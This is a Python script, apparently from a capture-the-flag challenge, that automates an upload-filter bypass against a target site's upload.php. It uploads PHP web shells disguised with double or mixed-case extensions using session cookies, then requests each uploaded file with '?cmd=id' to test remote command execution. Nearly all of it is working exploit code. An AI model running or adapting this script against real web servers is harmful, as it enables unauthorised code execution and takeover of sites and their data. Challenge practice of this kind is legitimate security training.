import subprocess
import re

cookie_file = 'cookies.txt'
base_url = 'https://50f9ff0a-ctf.dsg.id'

# Upload files dengan berbagai ekstensi
files_to_test = [
    'ws2.jpg.php',
    'ws2.png.php', 
    'ws2.PhP.jpg',
    'ws2.php.png',
]

for fname in files_to_test:
    print(f'\n[*] Uploading {fname}...')
    result = subprocess.run(
        ['curl', '-s', '-b', cookie_file, '-F', f'berkas=@{fname}', f'{base_url}/upload.php', '-L'],
        capture_output=True, text=True
    )
    output = result.stdout
    if 'berhasil diunggah' in output:
        print(f'  [+] SUCCESS! {fname} uploaded')
        # Try to execute
        for cmd_url in [
            f'{base_url}/uploads/{fname}?cmd=id',
        ]:
            r2 = subprocess.run(
                ['curl', '-s', '-b', cookie_file, '-L', cmd_url],
                capture_output=True, text=True
            )
            resp = r2.stdout.strip()
            print(f'  [?] Access {cmd_url}: {resp[:200]}')
    elif 'tidak diizinkan' in output:
        print(f'  [-] BLOCKED: {fname}')
    else:
        print(f'  [?] Unknown response for {fname}')
